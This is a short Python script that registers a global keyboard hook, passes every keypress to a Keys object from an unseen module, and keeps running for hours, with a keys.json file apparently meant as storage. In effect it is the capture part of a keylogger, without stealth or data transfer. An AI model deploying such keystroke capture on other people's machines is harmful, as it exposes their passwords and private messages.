from keys import *
from time import sleep
from os import listdir
from json import dump

if not "keys.json" in listdir():
    with open("keys.json", "w") as f:
        pass

keys = Keys()
def on_press(event):
    keys.add_key(event)
    
keyboard.on_press(on_press)

sleep(10000)